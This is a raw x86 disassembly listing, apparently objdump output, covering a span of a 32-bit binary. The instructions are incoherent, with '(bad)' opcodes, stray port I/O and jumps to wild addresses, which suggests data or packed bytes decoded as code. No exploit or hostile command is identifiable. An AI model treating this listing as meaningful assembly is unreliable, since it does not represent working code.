  40d6f3:	call   0x8e37c0ea
  40d6f8:	xor    al,ch
  40d6fa:	inc    ebp
  40d6fb:	jmp    DWORD PTR [eax-0x69]
  40d6fe:	cmc    
  40d6ff:	xor    eax,0x47db76
  40d704:	mov    ebp,0xb5005e9f
  40d709:	pushf  
  40d70a:	enter  0x300f,0x8c
  40d70e:	pop    es
  40d70f:	add    BYTE PTR [ebp-0x5a07b2b0],ah
  40d715:	xchg   ebx,eax
  40d716:	or     BYTE PTR [eax],al
  40d718:	repnz iret 
  40d71a:	cld    
  40d71b:	push   DWORD PTR [edx-0x5a95f76d]
  40d721:	jge    0x40d72b
  40d723:	push   0xffffffa5
  40d725:	jge    0x40d72f
  40d727:	lea    esi,[eax-0xf72ba14]
  40d72d:	loopne 0x40d72d
  40d72f:	dec    DWORD PTR [edx]
  40d731:	shl    ch,0x75
  40d734:	or     eax,0xfdfc7ce9
  40d739:	adc    BYTE PTR [edi+0x0],bl
  40d73c:	jne    0x40d6da
  40d73e:	enter  0x7074,0xfa
  40d742:	fiadd  WORD PTR [eax]
  40d744:	gs xchg ebx,eax
  40d746:	pusha  
  40d747:	scas   eax,DWORD PTR es:[edi]
  40d748:	std    
  40d749:	ror    DWORD PTR [eax],1
  40d74b:	dec    DWORD PTR [eax+ecx*2+0xe806]
	...
  40d762:	add    BYTE PTR [eax],al
  40d764:	push   esp
  40d765:	out    0xb4,eax
  40d767:	(bad)  
  40d768:	fsub   QWORD PTR [edx+0x6d118cdc]
  40d76e:	mov    ebx,0x580d23fe
  40d773:	call   0xfef5bebc
  40d778:	add    eax,0xbf6a4b8
  40d77d:	xchg   BYTE PTR [ebp+ebx*1-0x734c8189],ah
  40d784:	push   ecx
  40d785:	lea    ebx,[eax+ebp*2-0x70]
  40d789:	sbb    DWORD PTR [ebx+0x0],ecx
  40d78c:	jmp    0x40d7ed
  40d78e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d78f:	mul    bl
  40d791:	sbb    eax,0xf4bf34b5
  40d796:	dec    edx
  40d797:	add    ah,ah
  40d799:	nop
  40d79a:	es dec ebx
  40d79d:	mov    ds:0x3dbbeb8e,eax
  40d7a2:	mov    ch,0x82
  40d7a4:	stc    
  40d7a5:	call   0x3cf4d666
  40d7aa:	ds pop edx
  40d7ac:	punpckhbw mm7,QWORD PTR [ebx+eax*1-0x7b808be7]
  40d7b4:	test   al,0xdd
  40d7b6:	mov    ah,0xfe
  40d7b8:	xchg   ebx,eax
  40d7b9:	dec    esp
  40d7ba:	test   DWORD PTR [eax+edi*2+0xdfeb4ff],eax
  40d7c1:	shl    DWORD PTR [ebp-0x5de8840a],0x2
	...
  40d7dc:	mov    WORD PTR [ebx],?
  40d7de:	cmp    al,0xa
  40d7e0:	push   ebx
  40d7e1:	mov    cl,0xa5
  40d7e3:	mul    BYTE PTR [ebx-0x61]
  40d7e6:	mov    eax,ds:0xa13b8c02
  40d7eb:	sbb    DWORD PTR [ebx-0x6b],edx
  40d7ee:	jl     0x40d79f
  40d7f0:	inc    edx
  40d7f1:	es push edi
  40d7f3:	mov    esp,0xbc5738f8
  40d7f8:	cmp    ah,BYTE PTR [esi]
  40d7fa:	popf   
  40d7fb:	stos   DWORD PTR es:[edi],eax
  40d7fc:	cmp    ah,BYTE PTR [esi]
  40d7fe:	dec    edi
  40d7ff:	mov    esp,0x3b579ca0
  40d804:	and    BYTE PTR [esi],ah
  40d806:	aas    
  40d807:	sbb    al,0x38
  40d80a:	aas    
  40d80b:	mov    esp,0xde949512
  40d810:	or     ah,al
  40d812:	add    esi,DWORD PTR [edx+eax*1+0x65980826]
  40d819:	and    eax,0x3938bc07
  40d81e:	idiv   DWORD PTR [ebx+0x29503cea]
  40d824:	jecxz  0x40d84b
  40d826:	push   DWORD PTR [ebp-0xd]
  40d829:	sbb    eax,0x9fd2bbe7
  40d82e:	imul   DWORD PTR [ebx-0x4428d951]
  40d834:	ret    0xc7df
  40d837:	mov    bl,0xba
  40d839:	and    eax,0x252633c8
  40d83e:	iret   
  40d83f:	mov    ebx,0x0
	...
  40d854:	push   eax
  40d855:	sub    al,0xd9
  40d857:	mov    edi,0xbbbf25a1
  40d85c:	and    BYTE PTR [eax],ch
  40d85e:	enter  0x3997,0x94
  40d862:	(bad)  
  40d864:	dec    ebp
  40d865:	pushf  
  40d866:	fist   WORD PTR [eax+0x17]
  40d869:	cmp    BYTE PTR [ebx-0x40],ah
  40d86c:	ja     0x40d828
  40d86e:	fild   QWORD PTR ds:0xbf525bc
  40d874:	je     0x40d891
  40d876:	btc    DWORD PTR [edx+0x1b],esp
  40d87a:	or     DWORD PTR [esp+edx*1],ebp
  40d87d:	lods   eax,DWORD PTR ds:[esi]
  40d87e:	push   cs
  40d87f:	add    eax,0xdcf594c9
  40d884:	xchg   edi,eax
  40d885:	cmp    al,0xaa
  40d887:	pop    edi
  40d888:	pop    es
  40d889:	es neg ah
  40d88c:	add    esp,DWORD PTR [esi]
  40d88e:	jl     0x40d871
  40d890:	out    0xe0,eax
  40d892:	ins    DWORD PTR es:[edi],dx
  40d893:	inc    esi
  40d894:	out    0x5b,eax
  40d896:	retf   
  40d897:	in     eax,0x8f
  40d899:	mov    edi,0x51134581
  40d89e:	cmc    
  40d89f:	xchg   edi,eax
  40d8a0:	mov    esi,0x9308ba
  40d8a5:	es jl  0x40d899
  40d8a8:	aaa    
  40d8a9:	mov    edi,0x1c37166d
  40d8ae:	dec    esp
  40d8af:	or     eax,0xb15d6003
  40d8b4:	push   eax
  40d8b5:	xchg   esp,eax
  40d8b6:	cmp    DWORD PTR [eax+eax*1+0x0],0x0
	...
  40d8c9:	add    BYTE PTR [eax],al
  40d8cb:	add    BYTE PTR [edx-0x24],al
  40d8ce:	inc    edi
  40d8cf:	jmp    0x75493ee3
  40d8d4:	dec    esp
  40d8d5:	mov    esp,0x94514dbd
  40d8da:	pop    ebp
  40d8db:	sar    DWORD PTR [edx-0x42],1
  40d8de:	or     cl,ch
  40d8e0:	mov    dl,BYTE PTR [ebp+edi*2-0x12]
  40d8e4:	pop    ebp
  40d8e5:	cmp    al,0xce
  40d8e7:	cmp    ah,bh
  40d8e9:	and    eax,0x94885159
  40d8ee:	in     eax,0x77
  40d8f0:	addr16 push ebx
  40d8f2:	ins    DWORD PTR es:[edi],dx
  40d8f3:	sub    BYTE PTR [eax-0x67e30a3c],cl
  40d8f9:	sub    al,0xda
  40d8fb:	jnp    0x40d943
  40d8fd:	and    esp,ecx
  40d8ff:	mov    ch,0xa8
  40d901:	and    esi,esi
  40d903:	or     BYTE PTR [eax+0x530088da],0x98
  40d90a:	jnp    0x40d906
  40d90c:	stos   DWORD PTR es:[edi],eax
  40d90d:	fdivr  QWORD PTR [edx]
  40d90f:	rcr    BYTE PTR [esi+ebx*8-0x161d000a],0xa3
  40d917:	cmp    BYTE PTR [edx],bh
  40d919:	gs mov cl,0xff
  40d91c:	pop    eax
  40d91d:	in     al,dx
  40d91e:	div    BYTE PTR [ebp+0x2d]
  40d921:	lock cmp eax,0x56dec267
  40d927:	pop    esi
  40d928:	pop    esp
  40d929:	pop    ecx
  40d92a:	or     al,BYTE PTR [eax]
  40d92c:	clc    
  40d92d:	adc    ah,dl
  40d92f:	add    DWORD PTR [eax],0x0
	...
  40d942:	add    BYTE PTR [eax],al
  40d944:	imul   ebx,edi,0xdfe8c75a
  40d94a:	cmc    
  40d94b:	push   ebp
  40d94d:	xchg   edi,eax
  40d94e:	int    0x45
  40d950:	mov    eax,ds:0xe5000897
  40d955:	adc    cl,BYTE PTR [ebp+0xc]
  40d958:	popw   ds
  40d95a:	div    BYTE PTR [esp+ebx*8+0x32]
  40d95e:	mov    dh,0x2b
  40d960:	xchg   edx,eax
  40d962:	mov    edi,0xb197f1c2
  40d967:	add    ebp,esp
  40d969:	xchg   edi,eax
  40d96a:	or     bl,ch
  40d96c:	push   esp
  40d96d:	sbb    DWORD PTR [ebp+0x10],esi
  40d970:	mov    ch,0x73
  40d972:	or     ecx,DWORD PTR [ebx+0x187f8868]
  40d978:	ret    0x473
  40d97b:	jmp    FWORD PTR [eax-0x70]
  40d97e:	loopne 0x40d9f6
  40d980:	dec    ecx
  40d981:	(bad)  
  40d983:	sbb    esi,0xffffff8f
  40d986:	jnp    0x40d98d
  40d988:	lods   al,BYTE PTR ds:[esi]
  40d989:	(bad)  
  40d98a:	lock jmp 0x40d948
  40d98d:	enter  0x7f2b,0x22
  40d991:	(bad)  
  40d993:	or     DWORD PTR [eax+esi*2-0x52daa84c],ecx
  40d99a:	or     al,0x0
  40d99c:	mov    WORD PTR [eax],fs
  40d99e:	or     al,0xeb
  40d9a0:	lahf   
  40d9a1:	scas   al,BYTE PTR es:[edi]
  40d9a2:	mov    bl,0x7
  40d9a4:	loope  0x40d9e6
  40d9a6:	test   DWORD PTR [eax+eax*1+0x0],eax
	...
  40d9ba:	add    BYTE PTR [eax],al
  40d9bc:	push   esp
  40d9bd:	mov    dh,0x45
  40d9bf:	cld    
  40d9c0:	fwait
  40d9c1:	adc    edi,ecx
  40d9c3:	pop    es
  40d9c4:	dec    ebp
  40d9c5:	int    0x4
  40d9c7:	mov    ecx,edx
  40d9c9:	lds    eax,FWORD PTR [ecx+0x1bd63054]
  40d9cf:	mov    edx,ecx
  40d9d1:	aad    0x83
  40d9d3:	push   esp
  40d9d4:	and    BYTE PTR [edx],dh
  40d9d6:	push   esi
  40d9d7:	rcl    DWORD PTR [ebx+0x506ac6c],0xf8
  40d9de:	mov    cl,0x88
  40d9e0:	popa   
  40d9e1:	jns    0x40da2e
  40d9e3:	add    DWORD PTR [edi],0x24
  40d9e6:	cmp    BYTE PTR [edx-0x7cf20ff9],bl
  40d9ec:	mov    ah,0x2d
  40d9ee:	daa    
  40d9ef:	push   es
  40d9f0:	mov    bh,0x6d
  40d9f2:	jecxz  0x40d9c5
  40d9f4:	idiv   DWORD PTR [edx]
  40d9f6:	test   DWORD PTR [esp+edx*8-0x4b],eax
  40d9fa:	inc    ebp
  40d9fb:	cld    
  40d9fc:	aaa    
  40d9fd:	je     0x40d9cd
  40d9ff:	or     ecx,DWORD PTR [eax+eiz*2-0x6f0147d]
  40da06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da07:	mov    al,ds:0x4abb20
  40da0c:	jne    0x40da86
  40da0e:	add    BYTE PTR [esi-0x6e],dh
  40da11:	xchg   ah,cl
  40da13:	enter  0x3cce,0xa
  40da17:	jmp    DWORD PTR [ecx-0x3f]
  40da1a:	jg     0x40da5c
  40da1c:	mov    WORD PTR [ebp-0x50],ss
  40da1f:	add    BYTE PTR [bx+si],al
	...
  40da32:	add    BYTE PTR [eax],al
  40da34:	mov    edx,DWORD PTR [ebp+0x1cc88aae]
  40da3a:	gs ds js 0x40da03
  40da3e:	xchg   esp,edi
  40da40:	shl    DWORD PTR [ecx],cl
  40da42:	xchg   DWORD PTR [eax+0x2e8e88e0],edi
  40da48:	nop
  40da49:	and    ebp,edi
  40da4b:	mov    ebx,0xabe7a85a
  40da50:	ret    
  40da51:	mov    ch,0x66
  40da53:	mov    eax,0x7fff5496
  40da58:	jmp    0x3b44b9f1
  40da5d:	test   al,0xeb
  40da5f:	mov    eax,0x2e471cb8
  40da64:	sub    BYTE PTR ds:0x22232254,ch
  40da6a:	jnp    0x40daaa
  40da6c:	mov    BYTE PTR [ebp-0x5c],bl
  40da6f:	adc    eax,DWORD PTR [ebx-0x73fc73eb]
  40da75:	xchg   esp,eax
  40da76:	cs cs cwde 
  40da79:	and    DWORD PTR [ebp-0x7d341bf5],ebx
  40da7f:	mov    eax,0xafad0bf2
  40da84:	imul   BYTE PTR [eax+0x6dd8460e]
  40da8a:	adc    DWORD PTR [eax+edx*2-0x2208d8],ecx
  40da91:	adc    ah,BYTE PTR [ecx+0x54469703]
  40da97:	add    al,BYTE PTR [eax]
	...
  40daa9:	add    BYTE PTR [eax],al
  40daab:	add    BYTE PTR [edi+0x5c0459ac],dh
  40dab1:	and    DWORD PTR [ebp+0xc],edx
  40dab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dab5:	cmp    BYTE PTR [edi],0xb7
  40dab8:	stos   BYTE PTR es:[edi],al
  40dab9:	and    DWORD PTR ds:0xf7a7a310,esi
  40dabf:	stos   DWORD PTR es:[edi],eax
  40dac0:	jne    0x40da77
  40dac2:	or     BYTE PTR [esi-0x2aa3f125],dh
  40dac8:	push   cs
  40dac9:	pop    ebx
  40daca:	or     BYTE PTR [esi+ecx*4],bl
  40dacd:	sub    eax,0x28cd7041
  40dad2:	and    ah,0x3
  40dad5:	cmovs  ebp,ecx
  40dad8:	push   cs
  40dad9:	sub    al,0xd
  40dadb:	sbb    BYTE PTR [ebx],bl
  40dadd:	test   al,0x1c
  40dadf:	sbb    BYTE PTR [ebx],ah
  40dae1:	test   al,0xf0
  40dae3:	jbe    0x40da82
  40dae5:	mov    eax,fs
  40dae7:	lahf   
  40dae8:	outs   dx,BYTE PTR ds:[esi]
  40dae9:	and    esi,esi
  40daeb:	rcl    BYTE PTR [esi-0x191483ac],0x77
  40daf2:	push   edi
  40daf3:	push   esi
  40daf4:	jge    0x40db12
  40daf6:	not    ah
  40daf8:	jecxz  0x40db32
  40dafa:	sbb    al,0xc8
  40dafc:	fisub  DWORD PTR [ecx]
  40dafe:	div    BYTE PTR [ebx+eiz*8-0x2536ffc8]
  40db05:	and    DWORD PTR [ecx+ebp*8],esi
  40db08:	(bad)  
  40db09:	aam    0xe
  40db0b:	lahf   
  40db0c:	lea    ebp,ds:0x6a01
	...
  40db22:	add    BYTE PTR [eax],al
  40db24:	mov    ch,0x28
  40db26:	or     DWORD PTR [ecx+esi*2-0x62f1eed2],ebx
  40db2d:	and    cl,ah
  40db2f:	pop    edx
  40db30:	cmp    esp,DWORD PTR [ecx]
  40db32:	mul    BYTE PTR [esi]
  40db34:	dec    ebp
  40db35:	and    BYTE PTR [ecx],cl
  40db37:	jmp    0xa4c26fcb
  40db3c:	fwait
  40db3d:	pop    ecx
  40db3e:	or     ecx,ebp
  40db40:	(bad)  
  40db41:	xchg   esp,eax
  40db42:	or     dh,bl
  40db44:	jl     0x40db62
  40db46:	loope  0x40db1d
  40db48:	xchg   edx,eax
  40db49:	and    esi,esi
  40db4b:	bound  ecx,QWORD PTR [eax+eiz*1-0x40]
  40db4f:	add    bh,dh
  40db51:	test   BYTE PTR [eax],cl
  40db53:	push   ebp
  40db54:	push   ds
  40db55:	stc    
  40db56:	pop    esi
  40db57:	mov    esp,DWORD PTR [eax-0x74]
  40db5a:	mov    eax,eax
  40db5c:	ins    DWORD PTR es:[edi],dx
  40db5d:	(bad)  
  40db5e:	loopne 0x40db5c
  40db60:	xchg   edx,eax
  40db61:	out    0xf6,eax
  40db63:	mov    ebp,DWORD PTR ds:0xea0c7ce7
  40db69:	push   ds
  40db6a:	div    DWORD PTR [ebp+0x65]
  40db6d:	pop    ss
  40db6e:	dec    edi
  40db6f:	add    al,0xf6
  40db71:	pop    esp
  40db72:	add    al,0x0
  40db74:	popa   
  40db75:	xchg   edi,eax
  40db76:	cmc    
  40db77:	jne    0x40dbe2
  40db79:	or     eax,0xe7a5084f
  40db7e:	jl     0x40db88
  40db80:	fisttp QWORD PTR [eax+0xadaff60]
  40db86:	dec    ebp
  40db87:	adc    al,0x0
	...
  40db99:	add    BYTE PTR [eax],al
  40db9b:	add    BYTE PTR [ebx+ebx*1-0x6bcafe42],ch
  40dba2:	or     BYTE PTR [edi+0x5c],bl
  40dba5:	push   ebp
  40dba6:	push   es
  40dba7:	add    BYTE PTR [eax],al
  40dba9:	or     esp,edx
  40dbab:	and    DWORD PTR [ecx-0x11],0xffffff82
  40dbaf:	push   ebp
  40dbb0:	loope  0x40db90
  40dbb2:	pop    es
  40dbb3:	add    ch,dh
  40dbb5:	xchg   ebx,eax
  40dbb6:	or     BYTE PTR [ebx],ch
  40dbb8:	mov    bh,0xee
  40dbba:	dec    esp
  40dbbb:	or     al,0xe4
  40dbbd:	xchg   ebx,eax
  40dbbe:	or     BYTE PTR [eax],al
  40dbc0:	retf   0xc80f
  40dbc3:	or     DWORD PTR [eax],0xffffff98
  40dbc6:	or     BYTE PTR [ebp-0x4a],dh
  40dbc9:	out    0x7c,al
  40dbcb:	adc    al,0xf
  40dbcd:	xchg   ebx,eax
  40dbce:	bound  eax,QWORD PTR [eax]
  40dbd0:	sete   al
  40dbd3:	nop
  40dbd4:	stos   BYTE PTR es:[edi],al
  40dbd5:	jmp    0x92ddc5d0
  40dbda:	or     BYTE PTR [eax],al
  40dbdc:	mov    WORD PTR [edx-0x3772f3c3],gs
  40dbe2:	out    0xfe,eax
  40dbe4:	sbb    DWORD PTR ds:0x458474bd,edi
  40dbea:	cmp    DWORD PTR [edx-0x6d],esp
  40dbed:	out    0x81,al
  40dbef:	inc    esp
  40dbf0:	mov    dh,ch
  40dbf2:	and    eax,0x202df614
  40dbf7:	add    al,0x9
  40dbf9:	js     0x40dbab
  40dbfb:	dec    edi
  40dbfc:	mov    ?,WORD PTR fs:[ebx+0xfe]
	...
  40dc13:	add    BYTE PTR [ebx+0x14],ch
  40dc16:	or     eax,0x892d8c02
  40dc1b:	jl     0x40dba5
  40dc1d:	sub    esp,DWORD PTR [edi]
  40dc1f:	and    edx,DWORD PTR [ebx+0x20]
  40dc22:	sbb    bh,bh
  40dc24:	shl    DWORD PTR ds:0xb6ae1da2,0xbb
  40dc2b:	mov    cl,dl
  40dc2d:	sar    DWORD PTR [ebx+0xa539874],0x6a
  40dc34:	nop
  40dc35:	shl    BYTE PTR ds:0xfec5bcfc,0xfe
  40dc3c:	sbb    ebx,DWORD PTR [esi-0x5f]
  40dc3f:	(bad)  
  40dc40:	lea    ebp,ds:0x4189830a
  40dc46:	or     DWORD PTR [ebp-0x54],esi
  40dc49:	jbe    0x40dc70
  40dc4b:	adc    BYTE PTR [esi+0x2a],ah
  40dc4e:	mov    ebp,0x3f958474
  40dc53:	(bad)  
  40dc54:	jmp    0x40dbe3
  40dc56:	mov    ebx,0x9037874
  40dc5b:	push   0xffffff8c
  40dc5d:	add    ecx,DWORD PTR [edx]
  40dc5f:	call   0xfefe02d8
  40dc64:	mov    ch,0x5b
  40dc66:	or     DWORD PTR [eax],eax
  40dc68:	mov    WORD PTR [edx+eiz*2+0x5c988836],ss
  40dc6f:	loope  0x40dc23
  40dc71:	test   al,0xef
  40dc73:	mov    ah,0x20
  40dc75:	mov    edi,es
  40dc77:	pusha  
	...
  40dc8c:	sub    al,0x1f
  40dc8e:	iret   
  40dc8f:	mov    dl,BYTE PTR [eax+0x20]
  40dc92:	mov    bh,0x2e
  40dc94:	js     0x40dc40
  40dc96:	fild   QWORD PTR [ecx]
  40dc98:	nop
  40dc99:	cvtps2pi mm7,QWORD PTR [eax-0x4a60d32d]
  40dca0:	jp     0x40dcc0
  40dca2:	cdq    
  40dca3:	mov    ecx,DWORD PTR [esp+edx*4-0x6f177f21]
  40dcaa:	in     al,dx
  40dcab:	cs jnp 0x40dccb
  40dcae:	cmc    
  40dcaf:	adc    esp,esi
  40dcb1:	xchg   esi,eax
  40dcb2:	jbe    0x40dce2
  40dcb4:	test   BYTE PTR [esp+edi*2],ch
  40dcb7:	and    cl,BYTE PTR [ebx+0x1e]
  40dcba:	cmp    BYTE PTR [edx],al
  40dcbc:	mov    WORD PTR [edi+ebx*8-0x206c5956],ss
  40dcc3:	add    ecx,DWORD PTR [edi]
  40dcc5:	mov    al,ds:0x74a0fdeb
  40dcca:	inc    esi
  40dccb:	cs jl  0x40dc78
  40dcce:	div    DWORD PTR [eax+eiz*4-0x532ba874]
  40dcd5:	sbb    eax,0x8880b43f
  40dcda:	leave  
  40dcdb:	add    BYTE PTR [esi-0x6c],dh
  40dcde:	cdq    
  40dcdf:	add    esp,esp
  40dce1:	lock adc eax,0xa52bf2b4
  40dce7:	add    cl,BYTE PTR [esp+edx*4-0x6a6fc99e]
  40dcee:	je     0x40dcd3
	...
  40dd04:	fisub  DWORD PTR [edi+0x1d8429cf]
  40dd0a:	or     DWORD PTR [edi+edx*4+0x2c],edi
  40dd0e:	mov    al,0x88
  40dd10:	clc    
  40dd11:	push   ds
  40dd12:	neg    BYTE PTR [esp+edx*4-0x56]
  40dd16:	or     DWORD PTR [ebx-0x78],edx
  40dd19:	stos   BYTE PTR es:[edi],al
  40dd1a:	or     cl,al
  40dd1c:	push   ss
  40dd1d:	and    dh,dh
  40dd1f:	into   
  40dd20:	add    DWORD PTR [edi+0x7],edi
  40dd23:	jmp    0xedb4eeb7
  40dd28:	xchg   edi,eax
  40dd29:	test   al,0x14
  40dd2b:	scas   al,BYTE PTR es:[edi]
  40dd2c:	aad    0x20
  40dd2e:	or     ecx,ebp
  40dd30:	(bad)  
  40dd31:	xchg   esp,eax
  40dd32:	cmc    
  40dd33:	sbb    al,0x94
  40dd35:	stos   BYTE PTR es:[edi],al
  40dd36:	or     BYTE PTR [ebx],dl
  40dd38:	test   BYTE PTR [edi],cl
  40dd3a:	dec    esp
  40dd3b:	xchg   ebp,eax
  40dd3c:	shr    BYTE PTR [ebp*2-0x1fe1e071],0x84
  40dd44:	nop
  40dd45:	xchg   esp,eax
  40dd46:	or     BYTE PTR [edx-0x63],ch
  40dd49:	nop
  40dd4a:	(bad)  
  40dd4b:	sti    
  40dd4c:	fwait
  40dd4d:	push   ebp
  40dd4e:	dec    esp
  40dd4f:	ins    DWORD PTR es:[edi],dx
  40dd50:	mov    DWORD PTR [eax+ecx*1+0x1ca7fee9],edx
  40dd57:	ror    DWORD PTR [edi-0x2a9bf356],cl
  40dd5d:	and    BYTE PTR [ecx+0x41],bl
  40dd60:	retf   0xf61e
  40dd63:	inc    esi
  40dd64:	stc    
  40dd65:	cmp    DWORD PTR [ecx],ecx
  40dd67:	jmp    0x40dd6c
	...
  40dd7c:	(bad)  
  40dd7d:	adc    DWORD PTR [ebp+eiz*8+0x9],esi
  40dd81:	test   al,0x2
  40dd83:	jno    0x40dd0d
  40dd85:	xchg   esp,eax
  40dd86:	or     cl,ch
  40dd88:	sbb    BYTE PTR [edx+0x9],cl
  40dd8b:	jmp    0xe5b4ef1f
  40dd90:	jmp    0x894:0x885102a7
  40dd97:	add    ch,ah
  40dd99:	push   DWORD PTR [edx-0x766f1b00]
  40dd9f:	jge    0x40dd52
  40dda1:	sbb    al,0x78
  40dda3:	push   ebp
  40dda4:	scas   al,BYTE PTR es:[edi]
  40dda5:	inc    esi
  40dda6:	jp     0x40ddf9
  40dda8:	and    al,0x64
  40ddaa:	add    al,0x0
  40ddac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddad:	ror    BYTE PTR [esi],1
  40ddaf:	jae    0x40de1e
  40ddb1:	loope  0x40de2f
  40ddb3:	or     al,0x42
  40ddb5:	int3   
  40ddb6:	cld    
  40ddb7:	add    DWORD PTR [eax-0x24],0x1
  40ddbb:	rol    DWORD PTR [eax-0x24],1
  40ddbe:	div    BYTE PTR [ebp+0x49]
  40ddc1:	add    BYTE PTR [ecx],cl
  40ddc3:	data16 xor ah,bh
  40ddc6:	add    BYTE PTR [ebp+0x2d],0xe7
  40ddca:	jl     0x40dddc
  40ddcc:	adc    bl,BYTE PTR [ebp-0x4]
  40ddcf:	dec    DWORD PTR [eax+0x6d75f6e8]
  40ddd5:	add    BYTE PTR [edx+0x60],dl
  40ddd8:	adc    ah,bh
  40ddda:	div    BYTE PTR [ebp+0x39]
  40dddd:	jp     0x40dde9
  40dddf:	inc    DWORD PTR [eax]
	...
  40ddf1:	add    BYTE PTR [eax],al
  40ddf3:	add    BYTE PTR [eax-0x1c],cl
  40ddf6:	div    BYTE PTR [ebp-0x43]
  40ddf9:	(bad)  
  40ddfa:	fdivr  st,st(5)
  40ddfc:	mov    dl,0xe6
  40ddfe:	div    BYTE PTR [ebp-0x53]
  40de01:	push   DWORD PTR [ebx-0x42193d9b]
  40de07:	add    DWORD PTR ds:0x45eb0898,esi
  40de0d:	adc    esi,DWORD PTR [ebp+0xc]
  40de10:	and    BYTE PTR [edx+0x5b],ah
  40de13:	or     esp,DWORD PTR [edi+0x3081575c]
  40de19:	sbb    al,0xf6
  40de1b:	jmp    DWORD PTR ds:0x9248798e
  40de21:	pop    esp
  40de22:	add    al,0x8f
  40de24:	mov    eax,gs
  40de26:	mov    ebp,0x8817182
  40de2b:	shr    DWORD PTR [ecx+0x19],1
  40de2e:	mov    eax,0x5f85d874
  40de33:	fs retf 
  40de35:	and    dh,BYTE PTR [edx+0x44]
  40de38:	les    ebp,FWORD PTR [edx]
  40de3a:	adc    BYTE PTR ds:[ebx+0x39feb0b8],bh
  40de41:	xor    eax,0x559474b8
  40de46:	or     ah,BYTE PTR [eax-0x5d]
  40de49:	dec    edx
  40de4a:	mov    eax,0x9c78074
  40de4f:	call   FWORD PTR [ecx]
  40de51:	loope  0x40de0a
  40de53:	je     0x40ddd9
  40de55:	push   ebp
  40de56:	xor    edi,ebp
	...
  40de6c:	sub    edx,0xffffffb7
  40de6f:	je     0x40dee5
  40de71:	add    eax,0xfa73652c
  40de76:	add    BYTE PTR fs:[ebp+ebp*1-0x3a7614f6],cl
  40de7e:	or     al,0x0
  40de80:	mov    WORD PTR ds:0x2d7cc1b3,gs
  40de86:	pop    edi
  40de87:	mov    edi,DWORD PTR [eax]
  40de89:	jnp    0x40de16
  40de8b:	jl     0x40de21
  40de8d:	sub    eax,0x64da053f
  40de92:	into   
  40de93:	add    ecx,DWORD PTR [esi+eiz*4+0x3737083d]
  40de9a:	mov    ecx,0x2d853435
  40de9f:	call   FWORD PTR [ebx]
  40dea1:	scas   al,BYTE PTR es:[edi]
  40dea2:	ret    0xf03
  40dea5:	sbb    ecx,DWORD PTR [edx]
  40dea7:	jne    0x40dea6
  40dea9:	popa   
  40deaa:	cmp    eax,0x2d94f408
  40deaf:	(bad)  
  40deb0:	sti    
  40deb1:	xchg   ebx,eax
  40deb2:	int    0xba
  40deb4:	int    0x8f
  40deb6:	fist   WORD PTR [esi+0x17]
  40deb9:	sub    BYTE PTR [ebx+0x47],ch
  40debc:	xchg   esp,eax
  40debd:	bsr    edi,edi
  40dec0:	push   es
  40dec1:	nop
  40dec2:	dec    edi
  40dec3:	test   DWORD PTR [eax-0x7c],edx
  40dec6:	fbstp  TBYTE PTR [edi]
  40dec8:	xchg   ebx,eax
  40dec9:	setne  BYTE PTR [ebx]
  40decc:	ret    
  40decd:	arpl   WORD PTR [esi+0x6],dx
	...
  40dee4:	setns  bl
  40dee7:	add    edi,DWORD PTR [eax]
  40dee9:	mov    WORD PTR [edx+0x56],?
  40deec:	sbb    BYTE PTR [ebx],0x50
  40deef:	or     BYTE PTR [ebx],dl
  40def1:	xchg   esi,eax
  40def2:	bound  ebp,QWORD PTR [esi]
  40def4:	je     0x40de8a
  40def6:	xor    edi,ebx
  40def8:	push   es
  40def9:	shl    edi,0x53
  40defc:	sbb    edx,DWORD PTR [edi+0x4b940562]
  40df02:	mov    ds:0x7abf8c17,al
  40df07:	lahf   
  40df08:	push   cs
  40df09:	push   ecx
  40df0a:	mov    ah,0x58
  40df0c:	ret    0x250d
  40df0f:	adc    al,0x4b
  40df11:	xchg   ebp,eax
  40df12:	fild   WORD PTR [ebx]
  40df14:	mov    WORD PTR [edx+edi*2-0x1fae7fba],ss
  40df1b:	add    ecx,DWORD PTR [esp+edx*4-0x733f7b21]
  40df22:	fbstp  TBYTE PTR [esi]
  40df24:	test   BYTE PTR [ebp+0x1f],ch
  40df27:	push   ecx
  40df28:	ror    DWORD PTR [ebx+0x22],cl
  40df2b:	jmp    FWORD PTR [ebx]
  40df2d:	sbb    edx,ebp
  40df2f:	sti    
  40df30:	sub    eax,DWORD PTR [eax]
  40df32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df33:	mov    al,0x1a
  40df35:	mov    ds,WORD PTR [edi]
  40df37:	test   BYTE PTR ss:[ebp+0x1f],ch
  40df3b:	push   ecx
  40df3c:	imul   ecx,DWORD PTR [ebx+0x9],0x2b
  40df40:	add    ebx,DWORD PTR [edx]
  40df42:	and    DWORD PTR [edi+eiz*1+0xf17c1b],0x0
	...
  40df59:	add    BYTE PTR [eax],al
  40df5b:	add    BYTE PTR [edi],dl
  40df5d:	out    dx,eax
  40df5e:	push   esi
  40df5f:	push   ds
  40df60:	sbb    al,0x53
  40df62:	dec    esp
  40df63:	sbb    eax,0xe908948e
  40df68:	pop    edx
  40df69:	shl    ah,1
  40df6b:	cdq    
  40df6c:	push   edx
  40df6d:	sar    ah,1
  40df6f:	cdq    
  40df70:	cld    
  40df71:	mov    al,ds:0x1be40100
  40df76:	imul   dh
  40df78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df79:	shl    ah,1
  40df7b:	pop    esi
  40df7c:	mov    dh,0x16
  40df7e:	je     0x40df55
  40df80:	nop
  40df81:	mov    al,ds:0xa5bde20c
  40df86:	add    BYTE PTR [edx],al
  40df88:	shl    BYTE PTR [edi-0x72314fab],1
  40df8e:	or     BYTE PTR [edx],dl
  40df90:	aad    0x28
  40df92:	sub    BYTE PTR [eax+eiz*1],0x14
  40df96:	je     0x40df59
  40df98:	nop
  40df99:	xchg   esp,eax
  40df9a:	test   al,0xe9
  40df9c:	mov    ecx,0xdaa9218c
  40dfa1:	mov    ecx,0x948cabbf
  40dfa6:	and    DWORD PTR [eax+edi*8],0xbfebe953
  40dfad:	sub    al,0x61
  40dfaf:	add    eax,0x2c8019fb
  40dfb4:	cld    
  40dfb5:	or     eax,0x30c5a6f1
  40dfba:	or     ecx,ebp
  40dfbc:	(bad)  
  40dfbd:	xchg   esp,eax
  40dfbe:	loope  0x40dfda
	...
